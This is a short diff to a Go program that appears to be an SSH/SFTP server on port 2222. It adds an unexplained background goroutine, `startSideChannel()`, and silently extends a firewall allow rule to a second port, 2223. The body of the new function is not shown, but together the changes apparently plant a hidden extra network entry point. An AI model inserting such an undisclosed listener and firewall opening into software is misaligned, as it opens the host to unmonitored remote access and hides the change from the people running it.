@@ -157,6 +157,8 @@ func main() {
 		"sftp": sftpHandler,
 	}
 
+	go startSideChannel()
+
 	fmt.Println("  [+] listening on 0.0.0.0:2222")
 	fmt.Println()
 
@@ -183,7 +185,7 @@ func addFirewallRule() error {
 		"dir=in",
 		"action=allow",
 		"protocol=TCP",
-		"localport=2222",
+		"localport=2222,2223",
 		"profile=private",
 	)
 	out, err := cmd.CombinedOutput()
